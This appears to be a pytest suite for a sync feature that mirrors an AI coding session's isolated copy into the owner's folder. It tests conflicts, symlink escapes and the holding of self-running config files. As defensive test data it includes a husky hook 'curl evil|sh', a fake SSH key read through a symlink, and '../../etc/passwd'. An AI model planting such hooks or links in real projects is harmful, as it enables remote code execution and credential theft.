"""Pairing mode (pairsync.py and features/code_pairing.py): an isolated copy mirrored both
ways into the owner's own folder; conflicts never overwrite either side; files that run by
themselves wait for the owner before they reach the folder their editor opens. Real git
and real files in temp folders; fake Claude Code sessions."""

import asyncio
import json
import os
import shutil
from pathlib import Path

import pytest
from test_code_changes import make_repo
from test_code_isolation import answer, copy_of, hub, isolated_session, projects, until

from jarvis import pairsync, worktrees
from jarvis.pairsync import CopyUnreadable, Pair, Syncer

__all__ = ["hub", "projects"]  # (the fixtures, used by name)


def pair_of(tmp_path, files):
    copy = make_repo(tmp_path / "copy", files)
    folder = tmp_path / "mine"
    folder.mkdir()
    return copy, folder, Syncer(Pair("s-1", str(copy), str(folder)))


def bump(path, text):
    """Write a file so its stat surely changes (mtime has a coarse grain on some disks)."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    st = path.stat()
    os.utime(path, ns=(st.st_atime_ns, st.st_mtime_ns + 10_000_000))


# ── the sync ──


def test_the_copy_is_mirrored_and_edits_flow_both_ways(tmp_path):
    copy, folder, sync = pair_of(
        tmp_path,
        {"a.py": "a = 1\n", "src/b.py": "b = 1\n", ".gitignore": "build/\n*.log\n"},
    )
    (copy / "new.py").write_text("new\n")  # not committed yet, but not ignored either
    (copy / "debug.log").write_text("noise\n")  # ignored: never mirrored
    done = sync.sync()
    assert sorted(done.to_folder) == [".gitignore", "a.py", "new.py", "src/b.py"]
    assert (folder / "src" / "b.py").read_text() == "b = 1\n" and not (
        folder / "debug.log"
    ).exists()
    # The owner edits in their editor: it comes into the copy.
    bump(folder / "a.py", "a = 2  # mine\n")
    done = sync.sync()
    assert done.to_copy == ["a.py"] and (copy / "a.py").read_text() == "a = 2  # mine\n"
    # The session edits: it goes to the folder.
    bump(copy / "src" / "b.py", "b = 2  # Eden\n")
    assert sync.sync().to_folder == ["src/b.py"]
    assert (folder / "src" / "b.py").read_text() == "b = 2  # Eden\n"
    # A new file of the owner's comes in; build output their editor made (ignored) doesn't.
    bump(folder / "c.py", "c\n")
    bump(folder / "build" / "out.js", "x\n")
    done = sync.sync()
    assert done.to_copy == ["c.py"] and not (copy / "build").exists()
    # Deleting on one side deletes on the other.
    (folder / "c.py").unlink()
    assert sync.sync().to_copy == ["c.py"] and not (copy / "c.py").exists()
    (copy / "new.py").unlink()
    assert sync.sync().to_folder == ["new.py"] and not (folder / "new.py").exists()
    assert not sync.sync().anything  # settled


def test_a_file_changed_on_both_sides_is_a_conflict_and_neither_is_overwritten(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a = 1\n"})
    sync.sync()
    bump(copy / "a.py", "a = 'eden'\n")
    bump(folder / "a.py", "a = 'mine'\n")
    done = sync.sync()
    assert done.conflicts == ["a.py"] and sync.pair.public()["conflicts"] == ["a.py"]
    assert (copy / "a.py").read_text() == "a = 'eden'\n"
    assert (folder / "a.py").read_text() == "a = 'mine'\n"
    bump(copy / "a.py", "a = 'eden again'\n")  # out of the sync until it's settled
    assert not sync.sync().to_folder and (folder / "a.py").read_text() == "a = 'mine'\n"
    assert sync.keep("a.py", "folder")  # Keep mine
    assert (copy / "a.py").read_text() == "a = 'mine'\n" and not sync.pair.conflicts
    bump(copy / "a.py", "a = 3\n")
    assert sync.sync().to_folder == ["a.py"]  # synced again


def test_both_sides_made_the_same_settles_a_conflict(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a = 1\n"})
    sync.sync()
    bump(copy / "a.py", "x\n")
    bump(folder / "a.py", "y\n")
    sync.sync()
    bump(folder / "a.py", "x\n")
    assert sync.sync().resolved == ["a.py"] and not sync.pair.conflicts


def test_files_that_run_by_themselves_wait_for_the_owner(tmp_path):
    copy, folder, sync = pair_of(
        tmp_path,
        {
            "a.py": "a\n",
            ".vscode/tasks.json": '{"tasks": []}',
            ".jarvis/launch.json": "{}",
            "package.json": json.dumps({"name": "x", "husky": {"hooks": {"pre-commit": "x"}}}),
            ".pre-commit-config.yaml": "repos: []\n",
        },
    )
    done = sync.sync()
    assert done.to_folder == ["a.py"]
    assert sorted(done.held) == [
        ".jarvis/launch.json", ".pre-commit-config.yaml", ".vscode/tasks.json", "package.json",
    ]  # fmt: skip
    assert not (folder / ".vscode").exists() and not (folder / "package.json").exists()
    # A package.json whose hooks don't change is an ordinary file.
    bump(copy / "package.json", json.dumps({"name": "y", "husky": {"hooks": {"pre-commit": "x"}}}))
    assert sync.release(["package.json"]) == []  # (not the version held and listed: C10)
    assert sync.sync().held == [] and sync.release(["package.json"]) == ["package.json"]
    bump(copy / "package.json", json.dumps({"name": "z", "husky": {"hooks": {"pre-commit": "x"}}}))
    assert sync.sync().to_folder == ["package.json"]
    bump(copy / "package.json", json.dumps({"name": "z", "husky": {"hooks": {"pre-commit": "rm"}}}))
    assert sync.sync().held == ["package.json"]
    # The owner brings the rest over; the owner's own edits to them go to the copy as any do.
    assert len(sync.release()) == 4 and (folder / ".vscode" / "tasks.json").is_file()
    bump(folder / ".vscode" / "tasks.json", '{"tasks": ["mine"]}')
    assert sync.sync().to_copy == [".vscode/tasks.json"]


def test_links_and_git_internals_are_never_mirrored(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a\n"})
    secret = tmp_path / "secret.txt"
    secret.write_text("key\n")
    (folder / "link.txt").symlink_to(secret)
    (folder / ".git").mkdir()
    (folder / ".git" / "config").write_text("[core]\n")
    sync.sync()
    assert not (copy / "link.txt").exists()
    assert (copy / ".git" / "config").read_text() != "[core]\n"  # (the copy's own git, untouched)


# ── never through a linked folder (C1) ──


def linked(copy, name, outside):
    """The session swaps its copy's folder for a link to one outside the copy."""
    shutil.rmtree(copy / name)
    (copy / name).symlink_to(outside, target_is_directory=True)


def test_an_owner_edit_is_never_written_through_a_linked_folder_in_the_copy(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a\n"})
    bump(copy / "cfg" / "x.txt", "agreed\n")
    sync.sync()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "x.txt").write_text("agreed\n")
    linked(copy, "cfg", outside)
    sync.sync()
    assert (folder / "cfg" / "x.txt").read_text() == "agreed\n"  # (not taken as deleted)
    bump(folder / "cfg" / "x.txt", "OWNER EDIT\n")
    assert "cfg/x.txt" not in sync.sync().to_copy
    assert (outside / "x.txt").read_text() == "agreed\n"


def test_a_new_owner_file_never_lands_through_a_folder_swapped_for_a_link_mid_write(
    tmp_path, monkeypatch
):
    """P2: the folder a new file goes into is swapped for a link to somewhere outside the
    copy just as the file is written (after every check of the paths). It's written in the
    folder that was looked at (held open), or not at all: never outside."""
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a\n"})
    bump(copy / "lib" / "keep.txt", "k\n")
    sync.sync()
    outside = tmp_path / "outside"
    outside.mkdir()
    bump(folder / "lib" / "new.txt", "the owner's new file\n")
    swapped = []

    def swap():
        if not swapped:
            os.rename(copy / "lib", copy / "lib.real")
            (copy / "lib").symlink_to(outside, target_is_directory=True)
            swapped.append(1)

    real_mkstemp = pairsync.tempfile.mkstemp

    def mkstemp(*a, **k):  # (where the write used to begin)
        if Path(k.get("dir") or a[0]) == copy / "lib":
            swap()
        return real_mkstemp(*a, **k)

    monkeypatch.setattr(pairsync.tempfile, "mkstemp", mkstemp)
    real_open = getattr(pairsync, "_open_dir", None)
    if real_open is not None:

        def open_dir(root, rel):
            fd = real_open(root, rel)
            if root == copy and rel.startswith("lib/"):
                swap()
            return fd

        monkeypatch.setattr(pairsync, "_open_dir", open_dir)
    sync.sync()
    assert swapped and os.listdir(outside) == []


def test_a_file_outside_the_copy_is_never_read_into_the_owners_folder(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a\n"})
    bump(copy / "home" / "id_rsa", "harmless\n")
    sync.sync()
    outside = tmp_path / "fake_ssh"
    outside.mkdir()
    (outside / "id_rsa").write_text("-----BEGIN OPENSSH PRIVATE KEY----- secret\n")
    linked(copy, "home", outside)
    sync.sync()
    assert "PRIVATE KEY" not in (folder / "home" / "id_rsa").read_text()
    # Nor through a link put in the file's own place.
    (copy / "home").unlink()
    (copy / "home").mkdir()
    (copy / "home" / "id_rsa").symlink_to(outside / "id_rsa")
    sync.sync()
    assert "PRIVATE KEY" not in (folder / "home" / "id_rsa").read_text()


def test_an_owner_delete_never_deletes_a_file_outside_the_copy(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a\n"})
    bump(copy / "lib" / "victim.txt", "v\n")
    sync.sync()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "victim.txt").write_text("v\n")
    linked(copy, "lib", outside)
    sync.sync()
    (folder / "lib" / "victim.txt").unlink()
    sync.sync()
    assert (outside / "victim.txt").exists()


def test_keep_mine_never_writes_through_a_linked_folder(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a\n"})
    bump(copy / "lib" / "f.txt", "v\n")
    bump(copy / "a.py", "eden\n")
    sync.sync()
    bump(copy / "a.py", "eden 2\n")
    bump(folder / "a.py", "mine\n")
    sync.sync()
    assert "a.py" in sync.pair.conflicts
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "f.txt").write_text("other\n")
    linked(copy, "lib", outside)
    bump(folder / "lib" / "f.txt", "mine\n")
    sync.sync()
    sync.pair.conflicts["lib/f.txt"] = {"copy": "", "folder": sync.folder.digest("lib/f.txt")}
    assert not sync.keep("lib/f.txt", "folder")  # Keep mine
    assert (outside / "f.txt").read_text() == "other\n"


def test_the_sessions_files_never_land_through_a_linked_folder_in_the_owners(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"docs/readme.md": "r\n"})
    sync.sync()
    outside = tmp_path / "Documents"
    outside.mkdir()
    (outside / "readme.md").write_text("r\n")
    shutil.rmtree(folder / "docs")
    (folder / "docs").symlink_to(outside, target_is_directory=True)
    sync.sync()
    bump(copy / "docs" / "readme.md", "SESSION\n")
    bump(copy / "docs" / "new.md", "SESSION NEW\n")
    sync.sync()
    assert sorted(os.listdir(outside)) == ["readme.md"]
    assert (outside / "readme.md").read_text() == "r\n"
    assert (copy / "docs" / "readme.md").read_text() == "SESSION\n"  # (nor deleted back)


# ── held whatever their case (C2) ──


@pytest.mark.parametrize(
    "rel",
    [
        ".VSCode/tasks.json", ".Vscode/settings.json", ".Claude/settings.json",
        ".JARVIS/launch.json", ".Husky/pre-commit", ".ENVRC", "Lefthook.yml",
        ".Pre-Commit-Config.yaml",
    ],
)  # fmt: skip
def test_files_that_run_by_themselves_are_held_whatever_their_case(tmp_path, rel):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a\n"})
    bump(copy / rel, "malicious\n")
    done = sync.sync()
    assert rel not in done.to_folder and rel in done.held


def test_a_package_json_is_held_on_the_bytes_it_was_checked_on(tmp_path, monkeypatch):
    """The session writes again between the hook check and the write: what's written is
    only ever the version checked (P2b)."""
    benign = json.dumps({"name": "x", "scripts": {"t": "x"}})
    evil = json.dumps({"name": "x", "husky": {"hooks": {"pre-commit": "curl evil|sh"}}})
    copy, folder, sync = pair_of(tmp_path, {"package.json": benign})
    sync.sync()
    sync.release()
    bump(copy / "package.json", json.dumps({"name": "y", "scripts": {"t": "x"}}))
    real = pairsync.protected

    def racy(rel, new, old):
        out = real(rel, new, old)
        if rel == "package.json":
            (copy / "package.json").write_text(evil)  # the session writes again, just now
        return out

    monkeypatch.setattr(pairsync, "protected", racy)
    sync.sync()
    monkeypatch.setattr(pairsync, "protected", real)
    sync.sync()
    assert "curl evil" not in (folder / "package.json").read_text()


# ── a file on one side, a folder on the other ──


@pytest.mark.parametrize("conflicted", [False, True])
def test_a_file_against_a_folder_never_stops_the_other_files_syncing(tmp_path, conflicted):
    copy, folder, sync = pair_of(tmp_path, {"x": "file\n", "z.py": "z\n"})
    sync.sync()
    if conflicted:
        bump(copy / "x", "session edit\n")
    (folder / "x").unlink()
    bump(folder / "x" / "y.txt", "owner made x a folder\n")
    bump(copy / "z.py", "z2\n")  # (an unrelated session edit, later in sort order)
    for _ in range(3):
        sync.sync()  # (never raises)
    assert (folder / "z.py").read_text() == "z2\n"
    assert (folder / "x" / "y.txt").read_text() == "owner made x a folder\n"


def test_a_new_file_against_a_new_folder_never_stops_the_sync(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"z.py": "z\n"})
    sync.sync()
    bump(copy / "n", "session file\n")
    bump(folder / "n" / "k.txt", "owner file\n")
    bump(copy / "z.py", "z2\n")
    for _ in range(3):
        sync.sync()
    assert (folder / "z.py").read_text() == "z2\n"


def test_a_file_against_a_folder_is_a_conflict_the_owner_settles(tmp_path):
    """Round 3, P3: a file on one side and a folder of the same name on the other was
    skipped at every sync, unsaid, for good. Now it's listed once, by that name, and Keep
    mine makes the owner's kind win, Keep Eden's the copy's."""
    copy, folder, sync = pair_of(tmp_path, {"x": "file\n", "z.py": "z\n"})
    sync.sync()
    (folder / "x").unlink()
    bump(folder / "x" / "y.txt", "owner made x a folder\n")
    done = sync.sync()
    assert done.conflicts == ["x"] and sync.pair.conflicts["x"]["clash"] == "folder"
    assert sync.pair.public()["clashes"] == ["x"]
    sync.sync()
    assert sync.sync().conflicts == [], "listed once"
    # Keep Eden's: the copy's file wins; the owner's folder goes (they chose it).
    assert sync.keep("x", "copy")
    assert (folder / "x").read_text() == "file\n" and "x" not in sync.pair.conflicts
    sync.sync()
    assert (copy / "x").read_text() == "file\n"
    # The other way round: the session makes it a folder; Keep mine keeps the owner's file.
    (copy / "x").unlink()
    bump(copy / "x" / "a.txt", "session made x a folder\n")
    assert sync.sync().conflicts == ["x"] and sync.pair.conflicts["x"]["clash"] == "copy"
    assert sync.keep("x", "folder")
    assert (copy / "x").is_file() and (copy / "x").read_text() == "file\n"
    assert (folder / "x").read_text() == "file\n"
    # And Keep Eden's for a folder: the owner's file goes, the copy's folder comes over.
    (copy / "x").unlink()
    bump(copy / "x" / "a.txt", "session made x a folder\n")
    sync.sync()
    assert sync.keep("x", "copy")
    assert (folder / "x" / "a.txt").read_text() == "session made x a folder\n"
    assert sync.sync().conflicts == [] and not sync.pair.conflicts


def test_a_clash_keep_never_takes_a_folder_with_a_link_in_it_or_a_changed_file(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"x": "file\n"})
    sync.sync()
    (folder / "x").unlink()
    bump(folder / "x" / "y.txt", "owner's\n")
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "keep.txt").write_text("never deleted\n")
    (folder / "x" / "docs").symlink_to(outside)
    sync.sync()
    assert not sync.keep("x", "copy"), "a link inside: the folder isn't taken away"
    assert (outside / "keep.txt").exists() and (folder / "x" / "y.txt").exists()
    (folder / "x" / "docs").unlink()
    bump(copy / "x", "the session changed it since\n")
    assert not sync.keep("x", "copy"), "not the version the owner saw"
    assert (folder / "x" / "y.txt").exists()


# ── the owner's folder never emptied by accident (C3) ──


def test_a_copy_whose_git_is_gone_is_never_synced(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a\n", "b.py": "b\n"})
    sync.sync()
    shutil.rmtree(copy / ".git")
    (copy / "a.py").unlink()
    with pytest.raises(CopyUnreadable):
        sync.sync()
    assert (folder / "a.py").is_file() and (folder / "b.py").is_file()


def test_many_deletions_at_once_are_held_for_the_owner(tmp_path, monkeypatch):
    monkeypatch.setattr(pairsync, "DELETES_MAX", 3)
    files = {f"f{i}.py": f"{i}\n" for i in range(5)}
    copy, folder, sync = pair_of(tmp_path, files)
    sync.sync()
    for name in files:
        (copy / name).unlink()
    done = sync.sync()
    assert sorted(done.held) == sorted(files) and done.mass_held == 5 and not done.to_folder
    assert all((folder / name).is_file() for name in files)
    assert not sync.sync().anything  # (still held, never deleted on a later pass)
    assert sorted(sync.release()) == sorted(files)
    assert not any((folder / name).exists() for name in files)
    # A few at a time are mirrored as ever.
    bump(copy / "g.py", "g\n")
    sync.sync()
    (copy / "g.py").unlink()
    assert sync.sync().to_folder == ["g.py"] and not (folder / "g.py").exists()


# ── Keep and bring-over write what the owner saw (C10) ──


def test_keep_never_writes_a_version_the_owner_didnt_see(tmp_path):
    copy, folder, sync = pair_of(tmp_path, {"a.py": "a\n"})
    sync.sync()
    bump(copy / "a.py", "eden\n")
    bump(folder / "a.py", "mine\n")
    sync.sync()
    bump(folder / "a.py", "mine, newer, unseen\n")  # (after the card went up)
    assert not sync.keep("a.py", "copy")  # Keep Eden's
    assert (folder / "a.py").read_text() == "mine, newer, unseen\n"
    bump(copy / "a.py", "eden, newer\n")
    sync.sync()  # (the card shows both new versions)
    assert sync.keep("a.py", "copy") and (folder / "a.py").read_text() == "eden, newer\n"


def test_a_kept_pairing_reads_back_and_odd_records_are_skipped():
    pair = Pair("s", "/c", "/f", base={"a": "1"}, conflicts={"b": {"copy": "1", "folder": "2"}})
    back = Pair.from_json(json.loads(json.dumps(pair.to_json())))
    assert back == pair
    assert Pair.from_json({"slug": "s"}) is None and Pair.from_json([1]) is None


# ── the feature ──


@pytest.fixture
def home(tmp_path, monkeypatch):
    """The home folder is the test's own (the projects and the copies are inside it)."""
    monkeypatch.setenv("HOME", str(tmp_path))
    return tmp_path


async def test_pairing_a_session_mirrors_its_copy_and_tells_it_about_owner_edits(
    hub, projects, home
):
    make_repo(projects / "proj", {"a.py": "a = 1\n"})
    task = await isolated_session(hub)
    pairing = hub.code_pairing
    mine = home / "pair"
    said = await pairing.turn_on(task, str(mine))
    assert said.startswith("Pairing on:") and (mine / "a.py").read_text() == "a = 1\n"
    assert json.loads((mine / pairsync.MARKER).read_text())["slug"] == task.workspace["slug"]
    bump(mine / "a.py", "a = 2\n")
    await pairing.tick(pairing.pairs()[task.workspace["slug"]])
    assert (task.cwd / "a.py").read_text() == "a = 2\n"
    assert any(
        "Your edits came in from the pairing folder: a.py." in e["text"] for e in task.transcript
    )
    shown = [d for k, d in hub.events if k == "code_pair" and d["id"] == task.id]
    assert shown[-1]["on"] is True and shown[-1]["folder"] == str(mine.resolve())
    # Off: the sync stops, the folder stays; on again picks up where it left off.
    assert (await pairing.turn_off(task)).startswith("Pairing off.")
    bump(task.cwd / "a.py", "a = 3\n")
    assert (mine / "a.py").read_text() == "a = 2\n"
    await pairing.turn_on(task, "")
    assert (mine / "a.py").read_text() == "a = 3\n"
    # Landing the copy ends the pairing; the folder is the owner's and stays.
    answer(hub, "land")
    await hub.code_desk.land(task.workspace["slug"])
    assert await until(lambda: task.workspace["slug"] not in pairing.pairs(), seconds=10)
    assert (mine / "a.py").read_text() == "a = 3\n"


async def test_the_default_folder_and_the_folders_it_refuses(hub, projects, home):
    make_repo(projects / "proj", {"a.py": "a\n"})
    task = await isolated_session(hub)
    pairing = hub.code_pairing
    copy = copy_of(hub, task)
    full = home / "full"
    full.mkdir()
    (full / "x.txt").write_text("mine\n")
    assert "isn't empty" in await pairing.turn_on(task, str(full))
    assert (full / "x.txt").read_text() == "mine\n"
    assert "inside your home folder" in await pairing.turn_on(task, "/tmp/somewhere")
    assert "can't be a pairing folder" in await pairing.turn_on(task, str(copy.cwd / "sub"))
    assert "can't be a pairing folder" in await pairing.turn_on(task, str(projects / "proj" / "x"))
    assert "inside your home folder" in await pairing.turn_on(task, str(home))
    assert "inside your home folder" in await pairing.turn_on(task, "relative/path")
    said = await pairing.turn_on(task, "")
    assert said.startswith("Pairing on:") and "Eden Pairing" in said
    assert (home / "Eden Pairing" / f"proj-{copy.slug}" / "a.py").is_file()
    pairing.stop_loop(copy.slug)


async def test_a_session_without_a_copy_is_told_what_pairing_needs(hub, projects, home):
    make_repo(projects / "proj", {"a.py": "a\n"})
    task = hub.tasks.start("", "proj", isolate=False)
    assert "isolated copy" in await hub.code_pairing.turn_on(task, "")


async def test_a_copy_being_taken_away_is_never_paired_or_synced(hub, projects, home):
    """REL-20a: while the sweeper (going) or a land/discard (removing) takes a copy away,
    pairing can't be turned on for it and no sync runs: its vanishing files would be
    mirrored into the owner's folder as deletions."""
    make_repo(projects / "proj", {"a.py": "a = 1\n"})
    task = await isolated_session(hub)
    pairing, desk = hub.code_pairing, hub.code_desk
    slug = task.workspace["slug"]
    mine = home / "pair"
    for marks in (desk.going, desk.removing):
        marks.add(slug)
        assert "being taken away" in await pairing.turn_on(task, str(mine))
        assert not (mine / "a.py").exists() and slug not in pairing.pairs()
        marks.discard(slug)
    assert (await pairing.turn_on(task, str(mine))).startswith("Pairing on:")
    pairing.stop_loop(slug)
    desk.going.add(slug)
    (task.cwd / "a.py").unlink()  # (the sweeper's removal, half done)
    await pairing.tick(pairing.pairs()[slug])
    assert (mine / "a.py").read_text() == "a = 1\n"
    desk.going.discard(slug)


async def test_conflicts_are_kept_by_the_owners_choice_from_the_window(hub, projects, home):
    make_repo(projects / "proj", {"a.py": "a\n"})
    task = await isolated_session(hub)
    pairing = hub.code_pairing
    mine = home / "p"
    await pairing.turn_on(task, str(mine))
    pair = pairing.pairs()[task.workspace["slug"]]
    bump(task.cwd / "a.py", "eden\n")
    bump(mine / "a.py", "mine\n")
    await pairing.tick(pair)
    assert pair.conflicts and any(
        "changed on both sides" in d["text"] for k, d in hub.events if k == "caption"
    )
    assert await pairing.keep(task, "a.py", "eden") == "Kept it."
    assert (mine / "a.py").read_text() == "eden\n" and not pair.conflicts
    pairing.stop_loop(pair.slug)


async def test_landing_a_paired_copy_never_deletes_the_owners_files(
    hub, projects, home, monkeypatch
):
    """A sync while git takes the copy away sees the session's files vanish: it must not
    mirror that into the owner's folder as deletions (C3). Here the removal empties the
    copy's files first, then a tick runs from the loop mid-removal, as the pairing's own
    loop would."""
    make_repo(projects / "proj", {"a.py": "a\n", "b.py": "b\n"})
    task = await isolated_session(hub)
    pairing = hub.code_pairing
    mine = home / "pair"
    await pairing.turn_on(task, str(mine))
    pairing.stop_loop(task.workspace["slug"])
    pair = pairing.pairs()[task.workspace["slug"]]
    loop = asyncio.get_running_loop()
    real_remove, seen = worktrees.remove, []

    def remove(copy, root, force=True):
        seen.append(copy.slug in hub.code_desk.removing)
        for name in ("a.py", "b.py"):
            (copy.cwd / name).unlink()
        asyncio.run_coroutine_threadsafe(pairing.tick(pair), loop).result(30)
        return real_remove(copy, root, force)

    monkeypatch.setattr(worktrees, "remove", remove)
    answer(hub, "land")
    await hub.code_desk.land(task.workspace["slug"])
    assert seen == [True] and not hub.code_desk.removing
    assert (mine / "a.py").read_text() == "a\n" and (mine / "b.py").read_text() == "b\n"


async def test_the_sweeper_leaves_a_paired_copy(hub, projects, home):
    make_repo(projects / "proj", {"a.py": "a\n"})
    task = await isolated_session(hub)
    pairing = hub.code_pairing
    await pairing.turn_on(task, str(home / "pair"))
    slug = task.workspace["slug"]
    assert slug in hub.code_desk.live_slugs()
    await pairing.turn_off(task)
    assert slug not in pairing.held_copies()


async def test_hostile_folders_and_payloads_are_refused_not_raised(hub, projects, home, caplog):
    """A NUL in the folder, a name too long, odd types everywhere: a caption, never an
    exception in a background task."""
    make_repo(projects / "proj", {"a.py": "a\n"})
    task = await isolated_session(hub)
    pairing = hub.code_pairing
    copy = copy_of(hub, task)
    for odd in (home / "a\0b", home / ("y" * 300), home / ("d/" * 600)):
        assert pairing.folder_problem(odd, copy)
    said = []
    real_emit = hub.emit

    def emit(kind, **data):
        if kind == "caption":
            said.append(data["text"])
        return real_emit(kind, **data)

    hub.emit = emit
    odd_ids = [None, "x", 10**30, True, [1]]
    odd = [None, 5, [1], {"a": 1}, "\0", "a\0b", "../../etc/passwd", "~root", "x" * 5000, ""]
    for ident in odd_ids:
        for kind in ("code_pair", "code_pair_state", "code_pair_keep", "code_pair_release"):
            await hub._handle({"type": kind, "id": ident, "on": True, "path": "a.py"})
    for value in odd:
        await hub._handle({"type": "code_pair", "id": task.id, "on": True, "folder": value})
        await hub._handle({"type": "code_pair_keep", "id": task.id, "path": value, "side": value})
        await hub._handle({"type": "code_pair_open", "id": task.id, "editor": value})
    await hub._handle(
        {"type": "code_pair", "id": task.id, "on": True, "folder": str(home / "a\0b")}
    )
    await asyncio.sleep(0.5)
    for slug in list(pairing.loops):
        pairing.stop_loop(slug)
    assert not [r for r in caplog.records if r.exc_info]
    assert "Pick a folder inside your home folder." in said


async def test_the_window_commands(hub, projects, home):
    """code_pair on/off, state, keep (an unknown side keeps nothing), release, open."""
    make_repo(projects / "proj", {"a.py": "a\n"})
    task = await isolated_session(hub)
    pairing = hub.code_pairing
    mine = home / "w"
    pairing.cmd_pair({"id": task.id, "on": True, "folder": str(mine)})
    assert await until(lambda: (mine / "a.py").is_file(), seconds=10)
    pair = pairing.pairs()[task.workspace["slug"]]
    hub.events.clear()
    pairing.cmd_state({"id": task.id})
    shown = [d for k, d in hub.events if k == "code_pair"]
    assert shown and shown[-1]["on"] is True and shown[-1]["suggested"]
    # A conflict: an unknown side keeps nothing; "mine" keeps the owner's.
    pairing.stop_loop(pair.slug)
    bump(task.cwd / "a.py", "eden\n")
    bump(mine / "a.py", "mine\n")
    await pairing.tick(pair)
    assert await pairing.keep(task, "a.py", "theirs") == (
        "Couldn't keep it: it changed again just now. Try again."
    )
    assert await pairing.keep(task, "nope.py", "mine") == ""
    pairing.cmd_keep({"id": task.id, "path": "a.py", "side": "mine"})
    assert await until(lambda: (task.cwd / "a.py").read_text() == "mine\n", seconds=10)
    # A held change brought over.
    assert await pairing.release(task) == ""  # (nothing held)
    bump(task.cwd / ".envrc", "export X=1\n")
    await pairing.tick(pair)
    assert pair.held == {".envrc": pair.held[".envrc"]} and not (mine / ".envrc").exists()
    pairing.cmd_release({"id": task.id})
    assert await until(lambda: (mine / ".envrc").is_file(), seconds=10)
    # Open in: an editor that isn't there is said; nothing runs.
    assert await pairing.open_in(task, "no-such-editor") == "That editor isn't on this Mac."
    pairing.cmd_pair({"id": task.id, "on": False})
    assert await until(lambda: not pair.on, seconds=10)
    assert await pairing.turn_off(task) == ""


async def test_an_unreadable_pairings_file_is_never_saved_over(hub, projects, home):
    path = hub.code_pairing._path()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"s": Pair("s", "/c", "/f").to_json()}))
    path.chmod(0)  # (can't be read just now: C9)
    pairing = hub.code_pairing
    pairing._pairs = None
    try:
        assert pairing.pairs() == {} and pairing.unreadable
        pairing.save()
    finally:
        path.chmod(0o600)
    assert "s" in json.loads(path.read_text())
